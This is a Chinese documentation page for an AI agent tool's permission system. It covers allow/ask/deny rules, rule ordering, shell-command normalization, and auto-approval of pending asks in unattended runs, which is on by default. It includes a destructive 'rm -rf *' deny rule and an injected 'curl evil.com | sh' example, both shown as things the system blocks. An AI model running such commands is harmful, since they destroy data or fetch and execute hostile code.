title: Permissions
description: OpenCorvus 的 allow / ask / deny 规则、auto-permission 引擎与无人值守模式行为。
---

任何会「写文件 / 执行命令 / 调外部 API」的工具都必须过 permission 检查。实现位于 `packages/opencorvus/src/permission/next.ts`。

## 三个 action

| action | 语义 |
|---|---|
| `allow` | 静默放行 |
| `ask` | 暂停，发 `permission.asked` 事件，等操作员回复（或由 auto-permission 引擎代为回复） |
| `deny` | 抛 `DeniedError`，立刻中断工具调用 |

## 配置格式

```jsonc
{
  "permission": {
    "bash": {
      "~/projects/*": "allow",
      "npm run *": "allow",
      "rm -rf *": "deny",
      "*": "ask"
    },
    "skill": {
      "local-note": "deny",
      "sora": "ask"
    },
    "write": {
      "~/projects/**/*.md": "allow",
      "*": "ask"
    }
  }
}
```

## Last-match-wins

:::caution
permission 系统**最容易踩坑**的点：**后声明的规则优先级高于先声明的**。
:::

`PermissionNext.evaluate()`（`src/permission/next.ts:312-319`）用 `findLast` 扫描合并后的规则集：

```jsonc
{ "bash": {
  "*": "ask",              // 兜底
  "npm run *": "allow"     // ← 这条生效（在 * 之后）
}}
```

顺序反了就坏：

```jsonc
{ "bash": {
  "npm run *": "allow",    // ← 被 * 覆盖
  "*": "ask"
}}
```

## Bash 命令归一化

`BashArity`（`src/permission/arity.ts:25`）把 shell 命令归一化为"语义命令前缀"再做 pattern 匹配，避免绕过：

| 用户输入 | 归一化后 |
|---|---|
| `npm run test` | `npm run test` |
| `npm run test -- --watch` | `npm run test`（选项被剥离） |
| `cd foo && npm run test` | `npm run test`（前缀 cd 被剥离） |

`npm run test; curl evil.com | sh` 被切分：`;` 后的 `curl` 走独立的 permission 检查。`;`、`&&`、`||`、管道、反引号注入都受控。

## auto-permission 引擎

CI、benchmark、定时任务等无人值守场景下，不希望每次 `ask` 都阻塞等人。OpenCorvus 用 `experimental` 下两个独立细粒度开关（`src/config/config.ts:1297-1310`）取代了历史上的 `experimental.unattended` 总开关：

```jsonc
{
  "experimental": {
    "auto_permission": true,   // 默认 true — 自动放行 permission ask
    "auto_question":   true    // 默认 true — 超时自动拒绝悬置的澄清提问
  }
}
```

`auto_permission` 的实现在 `packages/opencorvus/src/engine/auto-permission.ts`。它订阅 `PermissionNext.Event.Asked`：当某个 ask 属于活跃 orchestrator run 时，立即用 `"once"` 回复并标 `autoReply: true`，overlay 在转录里显示为 `[auto-reply]` 以保持可见。

两条路径都能在无人值守下满足 `ask`：

1. **引擎路径**——`engine/auto-permission.ts` 在 `experimental.auto_permission === true` 时为任何 orchestrator run 内的 ask 即时回复。这是主路径。
2. **超时路径**——`permission/next.ts:162-211` 注册一个超时定时器，`OPENCORVUS_PERMISSION_TIMEOUT_MS`（默认 **120000 ms**——`permission/next.ts:163`）后自动回复 `"once"`。超时仅在 `experimental.auto_permission === true` 时触发；开关关闭时，`ask` 会无限等待操作员回复（不存在静默 fallback）。

```bash
export OPENCORVUS_PERMISSION_TIMEOUT_MS=60000   # 把自动放行超时收紧到 60s
```

允许的最小值是 `1000` ms（`permission/next.ts:161-165`），更小的值会被向上钳制。

:::note
旧的 `experimental.unattended` 开关已被删除。如果你的 config 仍写着该字段，OpenCorvus 在 parse 阶段会直接拒绝（`Config.Info` 是 `.strict()`——见 `src/config/config.ts:1336`）。迁移到 `experimental.auto_permission`（如果还想自动拒绝悬置提问，再加上 `experimental.auto_question`）。
:::

## 配置错误早期暴露

permission 字符串写错时**不 fallback**，直接抛。曾经有 bug：`permission: "allow"`（字符串而非对象）会被 `Object.entries` 当成字符拆开，导致规则全乱；已修复为 `PermissionNext.fromConfig` 中 `typeof === "string"` 的早返回（`src/permission/next.ts:62-85`）。
